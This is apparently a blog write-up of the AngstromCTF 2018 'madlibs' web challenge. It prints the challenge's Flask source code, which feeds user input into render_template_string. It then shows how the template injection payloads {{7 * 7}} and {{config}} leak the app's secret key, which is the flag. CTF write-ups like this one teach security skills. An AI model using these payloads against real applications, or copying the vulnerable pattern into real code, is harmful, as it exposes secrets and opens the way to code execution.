---
layout:     post
title:      "AngstromCTF - madlibs"
date:       2018-03-23 2:00:00
author:     "W3ndige"
permalink: /:title/
category: "AngstromCTF 2018"
---

Welcome to first write up from the Angstrom CTF, in which we're going to focus on web security.

- Category: Web
- Points: 120

{% highlight text %}
When Ian was a kid, he loved to play goofy Madlibs all day long. Now, he's decided to write his own website to generate them!
{% endhighlight %}

### Solution

We're presented with the website generating Madlibs stories, getting them from the user input. If you don't know what Madlibs is take a look [here](https://en.wikipedia.org/wiki/Mad_Libs), but it won't be needed in order to solve the challenge.

{% highlight html %}
<!doctype html>
<title>Angstrom MadLibs</title>

<body>

<h4>The Tale of a Person</h4>

<p>
A long, long time ago, there lived a in person. This person had a prized possesion, it was a my.
Every day before using their my, the person liked to closet.
</p>

<h4>THE END</h4>

This MadLib with title The Tale of a Person was created by hello at 2018-03-21 19:48:06
<br><br>
<a href="/">Click here to return to the home page.</a>
<br><br>
MadLib generated using program found <a href="../get-source">here</a>
</body>
</html>
{% endhighlight %}

As you can see, together with the interface we get a source code of this application, which is written in [Flask](http://flask.pocoo.org/).

{% highlight python %}
from flask import Flask, render_template, render_template_string, send_from_directory, request
from jinja2 import Environment, FileSystemLoader
from time import gmtime, strftime
template_dir = './templates'
env = Environment(loader=FileSystemLoader(template_dir))


madlib_names = ["The Tale of a Person","A Random Story"]
story_fields = {
    "The Tale of a Person":['Author Name','Adjective','Noun','Verb'],
    "A Random Story":['Author Name','Adjective','Noun','Any first name','Verb']
    }

app = Flask(__name__)
app.secret_key = open("flag.txt").read()

@app.route("/",methods=["GET"])
def home():
    return render_template("home.html",libs=madlib_names)

@app.route("/form/<templatename>",methods=["GET"])
def madlib(templatename):
    global madlib_names
    if templatename in madlib_names:  
        return render_template("home.html",libs=madlib_names,title=templatename,fields=story_fields[templatename])
    else:
        error_message = 'The MadLib with title "' + templatename + '" could not be found.'
        return render_template("home.html",libs=madlib_names,message=error_message)

@app.route("/result/<templatename>",methods=["POST"])
def output(templatename):

    if templatename not in madlib_names:    
        return "Template not found."

    inpValues = []
    for i in range(len(story_fields[templatename])):
        if not request.form[str(i+1)]:
            return "All form fields must be filled"
        else:
            inpValues.append(request.form[str(i+1)][:24])

    authorName = inpValues.pop(0)[:12]
    try:
        comment = render_template_string('''This MadLib with title %s was created by %s at %s''' % (templatename, authorName, strftime("%Y-%m-%d %H:%M:%S", gmtime())))
    except:
        comment = "Error generating comment."
    return render_template("_".join(templatename.lower().split())+".html",libtitle=templatename,footer=comment, libentries=inpValues)


@app.route("/get-source", methods=["GET","POST"])
def source():
    return send_from_directory('./','app.py')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=7777, threaded=True)
{% endhighlight %}

We can see the whole logic of written application, but is there something we can exploit? Let's focus on the user input, and specifically `authorName` variable that is used to store our name and print it inthe comment.

Firstly, we can see that it's being limited to only 12 characters, which we can easiliy check.

{% highlight python %}
authorName = inpValues.pop(0)[:12]
{% endhighlight %}

With author name `123456789abcd`, which is 13 characters, only first 12 `123456789abc` will be printed. That's the first obstacle we have to keep in mind.

After that we're getting to creating the comment with this line of code.

{% highlight python %}
comment = render_template_string('''This MadLib with title %s was created by %s at %s''' % (templatename, authorName, strftime("%Y-%m-%d %H:%M:%S", gmtime())))
{% endhighlight %}

Firstly, we have to think about `render_template_string()` function. Quick google will tell us, that it's used in order to work with templates, that will look just like in this [example](http://flask.pocoo.org/docs/0.12/tutorial/templates/). Further analysis of this code doesn't provide us with any new, or more useful information so let's stick to what we have already.

Part of the job of every person is IT is to learn how to google efficiently in order to look for information. That's what I did this time, googled `flask template vulnerability` and look what we have in [this](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html) link, which showed as the first one in this search engine.

In addition we get very interesting [whitepaper](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf), I advice everyone to read it. But back to the challenge. In quick words, we're able to inject Python code into the template, which will be then executed. Simple test works by putting the input {% raw %}`{{7 * 7}}`{% endraw %} in our author name input.

{% highlight text %}
 This MadLib with title The Tale of a Person was created by 49 at 2018-03-21 20:08:58
{% endhighlight %}

Great, it works! But how do we get the secret that is stored at `app.secret_key = open("flag.txt").read()` variable. As it's name is to long in order to work correctly, we'll have to find a workaround. Luckily, there's a [config]() that stores the configuration of our application. Let's take a look at it  with {% raw %}`{{config}}`{% endraw %}. And ladies and gentlemen, here we have the config.

{% highlight text %}
This MadLib with title The Tale of a Person was created by &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;actf{wow_ur_a_jinja_ninja}&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;LOGGER_NAME&#39;: &#39;__main__&#39;, &#39;LOGGER_HANDLER_POLICY&#39;: &#39;always&#39;, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: None, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: False, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: True, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None}&gt; at 2018-03-21 20:25:01
{% endhighlight %}

Spot the flag and here you go.
